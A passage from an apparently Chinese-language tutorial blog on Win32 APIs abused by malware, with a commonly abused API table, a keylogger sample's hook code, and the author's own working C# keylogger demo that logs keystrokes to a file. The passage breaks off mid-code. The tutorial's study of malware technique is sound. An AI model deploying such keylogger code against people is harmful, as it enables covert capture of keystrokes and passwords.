#ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&#39;Kernel32&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">NameSpace </span><span style="color: #98C379">&#39;Win32&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">PassThru;</span></span></code></pre></div></div></figure><p>现在就能用如下的语法调用这个 API：</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::&lt;Imported Call&gt;()</span></span></code></pre></div></div></figure><p>这个 PowerShell 和 NET 在之后的学习中会用到很多次，注意给的 demo 的区别是 PowerShell 代码通常含有 $。</p><h2 id="常用滥用-API"><a href="#常用滥用-API" class="headerlink" title="常用滥用 API"></a>常用滥用 API</h2><p>Win32 库中的一些 API 调用很容易被恶意活动利用。<a href="https://www.sans.org/white-papers/33649/">SANs</a> 和 <a href="http://malapi.io/">MalAPI.io</a> 在内的多个组织记录和整理了所有具有恶意的可用 API 调用。下面是一些常用滥用 API 的名字和作用：</p><table><thead><tr><th><strong>API Call</strong></th><th><strong>Explanation</strong></th></tr></thead><tbody><tr><td>LoadLibraryA</td><td>将指定的 DLL 加载到<strong>调用进程的虚拟地址空间</strong>中</td></tr><tr><td>GetUserNameA</td><td>检索与当前线程关联的用户名称</td></tr><tr><td>GetComputerNameA</td><td>检索本地计算机的 NetBIOS 或 DNS 名称</td></tr><tr><td>GetVersionExA</td><td>获取当前运行操作系统的版本信息</td></tr><tr><td>GetModuleFileNameA</td><td>检索指定模块（DLL 或 EXE）的<strong>完整路径</strong></td></tr><tr><td>GetStartupInfoA</td><td>获取当前进程的<strong>启动信息</strong></td></tr><tr><td>GetModuleHandle</td><td>如果指定的模块已被加载到当前进程的地址空间，则返回该<strong>模块的句柄</strong></td></tr><tr><td>GetProcAddress</td><td>返回指定 DLL 中<strong>导出函数</strong>的地址</td></tr><tr><td>VirtualProtect</td><td>更改调用进程<strong>虚拟地址空间中某段内存的保护属性</strong></td></tr></tbody></table><h2 id="案例学习"><a href="#案例学习" class="headerlink" title="案例学习"></a>案例学习</h2><p>现在我们已经了解了 Win32 库和常用滥用 API 调用的底层实现，接下来让我们分析两个恶意软件样本，并观察它们的调用如何交互。</p><h3 id="键盘记录器"><a href="#键盘记录器" class="headerlink" title="键盘记录器"></a>键盘记录器</h3><p>由于键盘记录器是用 C#编写的，它必须使用 P&#x2F;Invoke 来获取每个调用的指针。下面是恶意软件样本源代码的 P&#x2F;Invoke 定义片段。</p><figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 将一个钩子过程（Hook Procedure）安装到 Windows 系统中的一个钩子链上</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;user32.dll&quot;</span><span style="color: #ABB2BF">, CharSet </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">CharSet</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Auto</span><span style="color: #ABB2BF">, SetLastError </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">SetWindowsHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">idHook</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">LowLevelKeyboardProc</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpfn</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">hMod</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">uint</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwThreadId</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 从 Hook 链中移除 Hook</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;user32.dll&quot;</span><span style="color: #ABB2BF">, CharSet </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">CharSet</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Auto</span><span style="color: #ABB2BF">, SetLastError </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">return</span><span style="color: #ABB2BF">: </span><span style="color: #E5C07B">MarshalAs</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UnmanagedType</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Bool</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">bool</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">UnhookWindowsHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">hhk</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 如果指定的模块已映射到调用进程的地址空间中，则返回该模块的句柄</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32.dll&quot;</span><span style="color: #ABB2BF">, CharSet </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">CharSet</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Auto</span><span style="color: #ABB2BF">, SetLastError </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetModuleHandle</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpModuleName</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">WHKEYBOARDLL</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">13</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 返回一个伪句柄</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32.dll&quot;</span><span style="color: #ABB2BF">, CharSet </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">CharSet</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Auto</span><span style="color: #ABB2BF">, SetLastError </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetCurrentProcess</span><span style="color: #ABB2BF">();</span></span></code></pre></div></div></figure><p>下面是这个样本中 Hook 的片段</p><figure class="shiki c#"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Main</span><span style="color: #ABB2BF">() {</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // _proc 是一个回调函数，当有键盘事件发生时，Windows 会调用这个函数</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 如果钩子安装成功，SetHook 函数会返回一个钩子句柄，并存储在 _hookID 中</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">_hookID</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">SetHook</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">_proc</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 这是 C# 应用程序的消息循环</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 启动一个循环，等待和处理各种事件（如键盘事件、鼠标事件、窗口消息等）</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">Application</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Run</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 当程序退出消息循环时（比如用户关闭了窗口），会调用这个函数</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 它卸载之前安装的钩子，否则钩子会一直留在内存中，导致资源泄漏</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">UnhookWindowsHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">_hookID</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 退出应用程序</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">Application</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Exit</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">SetHook</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">LowLevelKeyboardProc</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">proc</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 这行代码获取当前正在运行的进程。using 关键字确保 curProcess 对象在使用后会被正确地释放</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">Process</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">curProcess</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Process</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">GetCurrentProcess</span><span style="color: #ABB2BF">()) {</span></span><span class="line"><span style="color: #7F848E; font-style: italic">        // 低级键盘钩子</span></span><span class="line"><span style="color: #7F848E; font-style: italic">        // 返回一个钩子句柄</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">SetWindowsHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">WHKEYBOARDLL</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">proc</span><span style="color: #ABB2BF">, </span><span style="color: #61AFEF">GetModuleHandle</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">curProcess</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">ProcessName</span><span style="color: #ABB2BF">), </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>参考：<a href="https://learn.microsoft.com/en-us/windows/win32/winmsg/using-hooks">Using Hooks</a></p><h4 id="键盘记录器-Demo"><a href="#键盘记录器-Demo" class="headerlink" title="键盘记录器 Demo"></a>键盘记录器 Demo</h4><p>这是我写的一个键盘记录器 Demo。</p><p>总体的过程是创建一个进程，然后给这个进程上一个全局的低级键盘钩子，让每次按键执行的时候都会触发我们的回调函数，回调函数记录并且写入按键到硬盘。</p><figure class="shiki c#"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Diagnostics</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">InteropServices</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Windows</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Forms</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Program</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 定义一个静态字段来存储钩子句柄</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">_hookID</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Zero</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 定义一个委托，用于处理键盘事件的回调函数</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">delegate</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">LowLevelKeyboardProc</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">nCode</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">wParam</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lParam</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 实例化 LowLevelKeyboardProc 委托，并指向我们自己的钩子回调函数</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">LowLevelKeyboardProc</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">_proc</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">HookCallback</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 这是 Windows API 函数的 P/Invoke 声明</span></span><span class="line"><span style="color: #ABB2BF">    [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;user32.dll&quot;</span><span style="color: #ABB2BF">, CharSet </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">CharSet</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Auto</span><span style="color: #ABB2BF">, SetLastError </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">SetWindowsHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">idHook</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">LowLevelKeyboardProc</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpfn</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">hMod</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">uint</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwThreadId</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;user32.dll&quot;</span><span style="color: #ABB2BF">, CharSet </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">CharSet</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Auto</span><span style="color: #ABB2BF">, SetLastError </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #ABB2BF">    [</span><span style="color: #C678DD">return</span><span style="color: #ABB2BF">: </span><span style="color: #E5C07B">MarshalAs</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UnmanagedType</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Bool</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">bool</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">UnhookWindowsHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">hhk</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32.dll&quot;</span><span style="color: #ABB2BF">, CharSet </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">CharSet</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Auto</span><span style="color: #ABB2BF">, SetLastError </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetModuleHandle</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpModuleName</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 键盘钩子类型，表示低级键盘钩子</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">WH_KEYBOARD_LL</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">13</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 键盘消息常量</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // WM_KEYDOWN: 普通按键被按下时发送的消息</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">const</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">WM_KEYDOWN</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x0100</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // WM_SYSKEYDOWN: 系统按键被按下时发送的消息（例如 ALT+TAB, F10 等）</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">const</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">WM_SYSKEYDOWN</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x0104</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 全局写入器</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">StreamWriter</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">logWriter</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 程序的入口点，也是核心逻辑所在</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Main</span><span style="color: #ABB2BF">()</span></span><span class="line"><span style="color: #ABB2BF">    {</span></span><span class="line"><span style="color: #7F848E; font-style: italic">        // 在程序启动时，打开一个文件用于写入日志</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">logWriter</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> new </span><span style="color: #E5C07B">StreamWriter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;keystrokes.log&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">_hookID</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">SetHook</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">_proc</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Application</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Run</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">UnhookWindowsHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">_hookID</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">        // 在程序退出时，关闭文件</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">logWriter</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Close</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Application</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Exit</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 安装钩子的方法</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">SetHook</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">LowLevelKeyboardProc</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">proc</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">    {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">Process</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">curProcess</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Process</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">GetCurrentProcess</span><span style="color: #ABB2BF">())</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">ProcessModule</span><span style="color: #ABB2BF"> </span><span 